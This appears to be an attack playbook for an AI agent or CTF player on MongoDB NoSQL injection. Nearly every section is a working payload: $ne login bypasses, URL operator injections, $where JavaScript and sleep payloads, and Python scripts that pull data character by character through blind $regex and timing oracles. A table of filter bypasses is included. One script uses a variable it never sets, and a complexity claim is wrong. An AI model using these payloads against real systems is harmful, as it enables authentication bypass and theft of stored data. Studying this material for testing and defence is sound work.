# NoSQL Injection (MongoDB)

## Trigger

Load when you see:

- JSON endpoints accepting MongoDB query operators: `$ne`, `$gt`, `$regex`, `$where`
- Node.js + MongoDB (Express + Mongoose) technology stack
- Search/filter endpoints with regex-like behavior
- Login endpoints with JSON body that might be passed directly to MongoDB
- Endpoints that accept query parameters as object keys or array notation
- URL parameters like `?name[$ne]=` or `?name[$regex]=`
- Errors mentioning MongoDB, Mongo, or BSON

## Attack Surface

- Authentication bypass via `$ne` operator (matches any non-null value)
- Blind data extraction via `$regex` and `$gt` operators (binary search char by char)
- JavaScript injection via `$where` operator (full JS execution on MongoDB server)
- Nested object injection in JSON bodies passed directly to MongoDB queries
- Array parameter injection in URL-encoded query strings
- `$lookup` traversal across collections for lateral data access
- Timing-based extraction via `$where` with `sleep()` in JavaScript

## Decision Tree

1. Test authentication: send `{"username": "admin", "password": {"$ne": ""}}` as JSON body
2. Test for `$regex` injection: send `{"search": {"$regex": ".*"}}` vs `{"search": {"$regex": "a^"}}` -- different result counts
3. Test for `$where` injection: if search parameter is interpolated into a `/.../i` regex, break out with `a^/)||true&&(/a^`
4. Test for array parameter injection: `?name[$ne]=` or `?id[$gt]=`
5. If blind injection confirmed, extract data via binary search using `$regex` or `$where` with `charCodeAt()`

## Techniques

### Authentication Bypass via $ne Operator

```json
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": ""}}
```

$ne matches any document where password is NOT equal to "" -- effectively any user with a password.

```json
// More specific: match admin user with any non-null password
{"username": "admin", "password": {"$gt": ""}}
```

### URL Parameter NoSQL Injection

```http
GET /api/users?name[$ne]= HTTP/1.1
# MongoDB query: { "name": { "$ne": "" } }
# Returns all users

GET /api/users?name[$regex]=.*&password[$regex]=.* HTTP/1.1
# Returns all users with password field matching anything
```

### Blind Extraction via $regex

```json
POST /api/search HTTP/1.1
Content-Type: application/json

{"search": {"$regex": "^a"}}   // Results start with 'a'
{"search": {"$regex": "^b"}}   // Results start with 'b'
```

### Binary Search via $regex and $gt

```python
import requests, string

def oracle(condition):
    r = requests.post("http://target/search", json={"search": {"$regex": condition}})
    return len(r.json()) > 0

# Extract flag character by character
flag = ""
charset = string.ascii_lowercase + string.digits + "_{}"
for pos in range(1, 100):
    for c in charset:
        if oracle(f"^{flag}{c}"):
            flag += c
            print(f"Flag so far: {flag}")
            break
    else:
        break  # No matching character found, we're done
```

### Regex Injection Breaking Out of /.../i Context

When user input is interpolated into `/.../i` in a MongoDB query:

```text
Input: a^/)||(<JS_CONDITION>)&&(/a^
Result: /a^/)||(<JS_CONDITION>)&&(/a^/i
```

This breaks the regex and injects a boolean condition:

```python
def oracle(condition):
    payload = f"a^/)||(({condition}))&&(/a^"
    r = requests.post("http://target/search", json={"search": payload})
    return len(r.json()) > 0

# Binary search for character extraction
def extract_char(pos):
    lo, hi = 31, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"this.product.charCodeAt({pos})>{mid}"):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo + 1)

for pos in range(100):
    char = extract_char(pos)
    flag += char
    if char == '}':
        break
```

### $where JavaScript Injection

```json
POST /api/query HTTP/1.1
Content-Type: application/json

{"$where": "sleep(5000) || ''"}
```

$where evaluates arbitrary JavaScript. Use for timing-based blind extraction:

```json
{"$where": "this.password.length == 32"}
{"$where": "this.password.charCodeAt(0) > 100"}
```

### Timing-Based Blind via $where + sleep

```python
import requests, time

def oracle_timing(condition):
    start = time.time()
    requests.post("http://target/search", json={
        "search": {"$where": f"if({condition}){{sleep(3000);}}"}
    })
    elapsed = time.time() - start
    return elapsed > 2.5  # Only true if condition matched

# Extract flag
flag = ""
for pos in range(1, 100):
    for c in "abcdefghijklmnopqrstuvwxyz0123456789_{}-":
        if oracle_timing(f"this.flag.charCodeAt({pos}) == {ord(c)}"):
            flag += c
            print(f"Flag: {flag}")
            break
    else:
        break
```

### Array/JSON Parameter Injection in Query Strings

```http
# MongoDB interprets these as query operators
GET /api/users?username[$gt]= HTTP/1.1
# Returns users with username greater than empty string (all users)

GET /api/users?username[$ne]=admin HTTP/1.1
# Returns users whose username is not "admin"

GET /api/users?username[$in][]=admin&username[$in][]=root&password[$ne]= HTTP/1.1
# User enumeration via $in operator
```

### Nested $lookup Traversal

If the injection point is in a `$lookup` pipeline stage:

```json
{"pipeline": [
    {"$match": {"status": "active"}},
    {"$lookup": {
        "from": "users",
        "localField": "userId",
        "foreignField": "_id",
        "as": "userData"
    }},
    {"$match": {"userData.isAdmin": true}}
]}
```

Test if injected fields can manipulate the pipeline:

```json
POST /api/reports HTTP/1.1
Content-Type: application/json

{"status": "active", "$lookup": {"from": "secrets", "pipeline": []}}
```

## Bypass

| Block | Bypass |
|-------|--------|
| String input validated | Try JSON object: `{"key": {"$ne": ""}}` |
| Query params ignored | Try array syntax: `?key[$ne]=` |
| Basic operators blocked | Try `$gt`, `$lt`, `$nin`, `$not`, `$exists` instead of `$ne` |
| `$where` disabled | Use `$regex` for blind extraction (slower but more common) |
| Input sanitized | Try double encoding, Unicode normalization |

## Verification

- Authentication bypass: login as admin with `{"password": {"$ne": ""}}`
- Boolean oracle: two queries returning different result counts confirms injection
- Timing oracle: `$where` with `sleep(5000)` causing 5-second delay confirms `$where` execution
- Character extraction: successfully extract at least 3 consecutive characters of a target string

## Pitfalls

- `$ne: ""` matches ANY non-empty value. If the actual password is empty, it won't match.
  Use `$gt: ""` instead for a broader match.
- Not all MongoDB drivers pass JSON operators to the database. Express body-parser vs
  native MongoDB driver behavior differs -- test with both JSON and URL-encoded formats.
- `$where` is disabled by default in Mongoose 7+ unless explicitly enabled.
- Timing-based extraction via `$where` with `sleep()` requires the MongoDB server to
  support JavaScript (not available on all Atlas tiers or MongoDB 6+ defaults).
- Blind `$regex` extraction uses index scans on large collections -- for long flags, the
  number of queries grows exponentially with flag length (characters * positions).
- MongoDB injection is primarily about operator injection (JSON structure), not string
  manipulation like SQL. The attack vector is the data structure, not escape sequences.
